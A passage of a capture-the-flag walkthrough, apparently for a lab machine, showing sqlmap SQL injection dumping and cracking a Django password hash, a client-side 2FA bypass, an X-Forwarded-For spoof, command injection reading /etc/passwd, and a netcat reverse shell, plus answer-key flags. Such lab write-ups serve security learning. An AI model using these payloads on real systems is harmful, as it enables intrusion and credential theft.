@@ -566,3 +566,571 @@ jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
 Content-Disposition: form-data; name="username"
 
 test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
+-----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="password"
+
+test
+-----------------------------24513989778820446811340418161--
+---
+[15:44:42] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[15:44:42] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[15:44:42] [INFO] fetching current database
+[15:44:42] [INFO] resumed: food
+[15:44:42] [INFO] fetching entries of column(s) 'username' for table 'auth_user' in database 'food'
+[15:44:42] [INFO] fetching number of column(s) 'username' entries for table 'auth_user' in database 'food'
+[15:44:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[15:44:42] [INFO] retrieved: 2
+[15:44:46] [INFO] retrieved: admin
+[15:45:03] [INFO] retrieved: anof
+Database: food
+Table: auth_user
+[2 entries]
++----------+
+| username |
++----------+
+| admin    |
+| anof     |
++----------+
+
+[15:45:17] [INFO] table 'food.auth_user' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_user.csv'
+[15:45:17] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 40 times
+[15:45:17] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.192.246'
+[15:45:17] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 15:45:17 //
+
+┌──(witty㉿kali)-[~]
+└─$ sqlmap -r req_crylo --dump -T auth_user -C password
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.2#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:49:16 //
+
+[15:49:16] [INFO] parsing HTTP request from 'req_crylo'
+Multipart-like data found in POST body. Do you want to process it? [Y/n/q] y
+Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
+[15:49:18] [INFO] resuming back-end DBMS 'mysql' 
+[15:49:18] [INFO] testing connection to the target URL
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART username ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: -----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="csrfmiddlewaretoken"
+
+jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
+-----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="username"
+
+test' AND 3386=(SELECT (CASE WHEN (3386=3386) THEN 3386 ELSE (SELECT 9893 UNION SELECT 8553) END))-- QIDa
+-----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="password"
+
+test
+-----------------------------24513989778820446811340418161--
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: -----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="csrfmiddlewaretoken"
+
+jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
+-----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="username"
+
+test';SELECT SLEEP(5)#
+-----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="password"
+
+test
+-----------------------------24513989778820446811340418161--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: -----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="csrfmiddlewaretoken"
+
+jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
+-----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="username"
+
+test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
+-----------------------------24513989778820446811340418161
+Content-Disposition: form-data; name="password"
+
+test
+-----------------------------24513989778820446811340418161--
+---
+[15:49:20] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[15:49:20] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[15:49:20] [INFO] fetching current database
+[15:49:20] [INFO] resumed: food
+[15:49:20] [INFO] fetching entries of column(s) 'password' for table 'auth_user' in database 'food'
+[15:49:20] [INFO] fetching number of column(s) 'password' entries for table 'auth_user' in database 'food'
+[15:49:20] [INFO] resumed: 2
+[15:49:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[15:49:20] [INFO] retrieved: pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=
+[15:54:34] [INFO] retrieved: VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1M 2
+Database: food
+Table: auth_user
+[2 entries]
++------------------------------------------------------------------------------------------+
+| password                                                                                 |
++------------------------------------------------------------------------------------------+
+| pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE= |
+| VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1M 2                                             |
++------------------------------------------------------------------------------------------+
+
+[15:57:16] [INFO] table 'food.auth_user' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_user.csv'
+[15:57:16] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 453 times
+[15:57:16] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.192.246'
+[15:57:16] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 15:57:16 //
+
+https://hashcat.net/forum/thread-9076.html
+
+┌──(witty㉿kali)-[~]
+└─$ cat hash_crylo 
+pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=
+
+┌──(witty㉿kali)-[~]
+└─$ hashcat -m10000 hash_crylo -a0 /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 2058/4180 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=:trigger
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
+Hash.Target......: pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZA...ZstpE=
+Time.Started.....: Sun Aug 13 16:06:08 2023 (1 min, 45 secs)
+Time.Estimated...: Sun Aug 13 16:07:53 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       27 H/s (8.79ms) @ Accel:64 Loops:256 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2816/14344385 (0.02%)
+Rejected.........: 0/2816 (0.00%)
+Restore.Point....: 2560/14344385 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259840-259999
+Candidate.Engine.: Device Generator
+Candidates.#1....: gators -> medicina
+Hardware.Mon.#1..: Util: 81%
+
+Started: Sun Aug 13 16:04:26 2023
+Stopped: Sun Aug 13 16:07:56 2023
+
+admin:trigger
+
+Enter Your Pin:
+```
+![[Pasted image 20230813140103.png]]
+![[Pasted image 20230813140527.png]]
+What is the name of the first username?
+*admin*
+What is the password for the above user?
+Brute-forcing is out of scope.
+*trigger*
+![[Pasted image 20230813152329.png]]
+### Task 3  Encryption
+Find a way to bypass the 2FA PIN and login into the application.
+Answer the questions below
+```text
+function submitForm(oFormElement) {
+    var xhr = new XMLHttpRequest();
+    //xhr.responseType = 'json';
+    xhr.onload = function() {
+        var encryptedresp = xhr.responseText;
+        var k = "8080808080808080";
+        var key = CryptoJS.enc.Utf8.parse(k);
+        var iv = CryptoJS.enc.Utf8.parse(k);
+        var item = encryptedresp;
+        var result = CryptoJS.AES.decrypt(item, key,
+  {
+      keySize: 128 / 4,
+      iv: iv,
+      mode: CryptoJS.mode.CBC,
+      padding: CryptoJS.pad.Pkcs7
+  })
+        var result = result.toString(CryptoJS.enc.Utf8);
+        //////////var jsonResponse = JSON.parse(xhr.responseText);
+        var jsonResponse = JSON.parse(result);
+        //alert(xhr.responseText);
+        //var jsonResponse = xhr.responseText;
+        console.log(jsonResponse);
+        if (jsonResponse.pin_set == "true") {
+            //Redirect to 2fa
+            //window.location.replace("/2fa");
+            //document.getElementsByClassName
+            document.getElementById("loginid").style.display = "none";
+            document.getElementById("enterpinid").style.display = "flex";
+        } else if (jsonResponse.pin_set == "false") {
+            //redirect to set pin
+            //window.location.replace("/set-pin");
+            document.getElementById("loginid").style.display = "none";
+            document.getElementById("createpinid").style.display = "flex";
+        } else {
+            // Invalid username/ password
+            alert(jsonResponse.reason);
+        }
+    }
+    xhr.open(oFormElement.method, oFormElement.action, true);
+    xhr.send(new FormData(oFormElement));
+    return false;
+}
+
+function encrypt() {
+    var pass = document.getElementById('pin2').value; {
+        //document.getElementById("hide").value = document.getElementById("pin").value;
+        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
+        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
+        key = CryptoJS.enc.Base64.parse(key);
+        iv = CryptoJS.enc.Base64.parse(iv);
+        var cipherData = CryptoJS.AES.encrypt(pass, key, {
+            iv: iv
+        });
+        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });
+
+        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
+        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
+        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
+        //var hash = CryptoJS.MD5(pass);
+        document.getElementById('pin2').value = cipherData;
+        return true;
+        console.log(document.getElementById('pin2').value)
+    }
+}
+
+function encrypt2() {
+    var pass = document.getElementById('pin3').value; {
+        //document.getElementById("hide").value = document.getElementById("pin").value;
+        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
+        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
+        key = CryptoJS.enc.Base64.parse(key);
+        iv = CryptoJS.enc.Base64.parse(iv);
+        var cipherData = CryptoJS.AES.encrypt(pass, key, {
+            iv: iv
+        });
+        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });
+
+        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
+        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
+        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
+        //var hash = CryptoJS.MD5(pass);
+        document.getElementById('pin3').value = cipherData;
+        return true;
+        console.log(document.getElementById('pin3').value)
+    }
+}
+
+after we logged we see in console
+
+Object { pin_set: "true", email: "admin@admin.com", success: "true" }
+
+so let's change pin_set to false
+
+debug line 23 (at the time of logging)
+
+  if (jsonResponse.pin_set == "true") {
+            //Redirect to 2fa
+            //window.location.replace("/2fa");
+            //document.getElementsByClassName
+            document.getElementById("loginid").style.display = "none";
+            document.getElementById("enterpinid").style.display = "flex";
+        } else if (jsonResponse.pin_set == "false") {
+            //redirect to set pin
+            //window.location.replace("/set-pin");
+            document.getElementById("loginid").style.display = "none";
+            document.getElementById("createpinid").style.display = "flex";
+        } else {
+            // Invalid username/ password
+            alert(jsonResponse.reason);
+        }
+
+then in console
+
+allow pasting
+
+jsonResponse = {
+
+"pin_set": "false",
+
+"email": "admin@admin.com",
+
+"success": "true"
+
+}
+
+Object { pin_set: "false", email: "admin@admin.com", success: "true" }
+
+Set Your Pin :
+
+and set a pin u like e.g 1337
+
+and log in again but with the pin u set
+
+Hello, admin
+```
+![[Pasted image 20230813153547.png]]
+![[Pasted image 20230813153626.png]]
+Which library is used for encryption and decryption?
+*CryptoJS*
+Which JSON parameter was used to validate the pin?
+*pin_set*
+Which encryption method is used?
+*AES*
+### Task 4  Forbidden Bypass
+Look at the response of the forbidden page after login and find a way to bypass it.
+Answer the questions below
+```text
+go to /debug 
+
+The page is for Local Users Only
+
+like harder (using burp)
+
+X-Forwarded-For:127.0.0.1
+
+request: 
+
+GET /debug HTTP/1.1
+
+Host: 10.10.205.91
+
+X-Forwarded-For:127.0.0.1
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: username=admin; password=trigger; csrftoken=ZvCgeGdgx0heHtChpzcLDbo3K9vb8sO69qZFaAnGlhdBVZy9cvVA13vfTMorJNF5; Token=G9e2q6ywEaqk6voNgUYOzFSFlkYYqRUc; sessionid=ji86uvc7azkqlnzyi7terby5rfgqcsvv
+
+Upgrade-Insecure-Requests: 1
+
+response:
+
+HTTP/1.1 200 OK
+
+Server: nginx/1.18.0 (Ubuntu)
+
+Date: Sun, 13 Aug 2023 20:40:27 GMT
+
+Content-Type: text/html; charset=utf-8
+
+Connection: close
+
+X-Frame-Options: DENY
+
+Vary: Cookie
+
+X-Content-Type-Options: nosniff
+
+Referrer-Policy: same-origin
+
+Set-Cookie: csrftoken=ZvCgeGdgx0heHtChpzcLDbo3K9vb8sO69qZFaAnGlhdBVZy9cvVA13vfTMorJNF5; expires=Sun, 11 Aug 2024 20:40:27 GMT; Max-Age=31449600; Path=/; SameSite=Lax
+
+Content-Length: 1173
+
+For Internal Usage
+Check for open services
+
+https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+
+80 ; cat /etc/passwd 
+or
+80 & cat /etc/passwd 
+
+and not to forget adding header
+
+X-Forwarded-For:127.0.0.1
+
+http 80/tcp www # WorldWideWeb HTTP domain-s 853/udp # DNS over DTLS [RFC8094] socks 1080/tcp # socks proxy server http-alt 8080/tcp webcache # WWW caching service nbd 10809/tcp # Linux Network Block Device amanda 10080/tcp # amanda backup services canna 5680/tcp # cannaserver zope-ftp 8021/tcp # zope management by ftp tproxy 8081/tcp # Transparent Proxy omniorb 8088/tcp # OmniORB omniorb 8088/udp root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin anof:x:1000:1000:anof:/home/anof:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false crylo:x:1001:1001::/home/crylo:/bin/bash fwupd-refresh:x:114:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+```
+What extra header can be used to bypass the page?
+Check the IP spoof
+*X-Forwarded-For*
+Which IP is allowed to access the page?
+*127.0.0.1*
+Exploit the web app to gain access to the machine and submit the flags.
+Answer the questions below
+```text
+revshell
+
+80 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f
+
+┌──(witty㉿kali)-[~]
+└─$ rlwrap nc -lvnp 1337                                     
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.205.91] 59280
+bash: cannot set terminal process group (1185): Inappropriate ioctl for device
+bash: no job control in this shell
+crylo@crylo:~/Food/food$ id
+id
+uid=1001(crylo) gid=33(www-data) groups=33(www-data)
+crylo@crylo:~/Food/food$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+</bash')" || /usr/bin/script -qc /bin/bash /dev/null
+crylo@crylo:~/Food/food$ cd /home
+cd /home
+crylo@crylo:/home$ ls
+ls
+anof  crylo
+crylo@crylo:/home$ cd crylo
+cd crylo
+crylo@crylo:~$ ls
+ls
+Food  user.txt
+crylo@crylo:~$ cat user.txt
+cat user.txt
+fa3e352b00adf9d4e967ad0e34d5e59d
+
+crylo@crylo:~$ getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}'
+getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}'
+anof
+crylo
+crylo@crylo:~$ getent passwd
+getent passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+anof:x:1000:1000:anof:/home/anof:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+crylo:x:1001:1001::/home/crylo:/bin/bash
+fwupd-refresh:x:114:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+crylo@crylo:~$ getent group sudo
+getent group sudo
+sudo:x:27:anof
+
+or
+
+crylo@crylo:~$ grep '^sudo:' /etc/group
+
+grep '^sudo:' /etc/group
+sudo:x:27:anof
+
+crylo@crylo:~/Food/food$ grep -r encrypt .
+grep -r encrypt .
+./assets/js/aes.js:            _createHelper: function(e) { return { encrypt: function(b, k, d) { return ("string" == typeof k ? c : a).encrypt(e, b, k, d) }, decrypt: function(b, k, d) { return ("string" == typeof k ? c : a).decrypt(e, b, k, d) } } }
+./assets/js/aes.js:            b.encryptBlock(e, a);
+./assets/js/aes.js:            encrypt: function(a, b, c, d) {
+./assets/js/aes.js:            encrypt: function(b, c, d, l) {
+./assets/js/aes.js:                b = a.encrypt.call(this, b, c, d.key, l);
+./assets/js/aes.js:            encryptBlock: function(a, b) { this._doCryptBlock(a, b, this._keySchedule, t, r, w, v, l) },
+Binary file ./accounts/__pycache__/views.cpython-38.pyc matches
+Binary file ./accounts/__pycache__/views.cpython-37.pyc matches
+./accounts/enc.py:# ciphertext = cipher.encrypt(padded_data)
+./accounts/enc.py:# encryptor = AES.new(key, mode, iv)
+./accounts/enc.py:# cipher = encryptor.encrypt(pad_text)
+./accounts/enc.py:# cipher_text = e.encrypt(padded_text.encode())
+./accounts/enc.py:ct = cipher1.encrypt(pad(data, 16))
+./accounts/views.py:                cipher_text = e.encrypt(padded_text1.encode())
+./accounts/views.py:                cipher_text = e.encrypt(padded_text1.encode())
+./accounts/views.py:            cipher_text = e.encrypt(padded_text1.encode())
+./accounts/views.py:        ciphertext = cipher.encrypt(padded_data)
+./accounts/views.py:        ciphertext = cipher.encrypt(padded_data)
+./templates/set-pin.html:        function encrypt() {
+./templates/set-pin.html:                var cipherData = CryptoJS.AES.encrypt(pass, key, {
+./templates/set-pin.html:                //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
+
+crylo@crylo:~/Food/food$ ls
+ls
+accounts  assets  food  manage.py  media  nano  __pycache__  static  templates
+crylo@crylo:~/Food/food$ cd accounts
+cd accounts
+crylo@crylo:~/Food/food/accounts$ ls
+ls
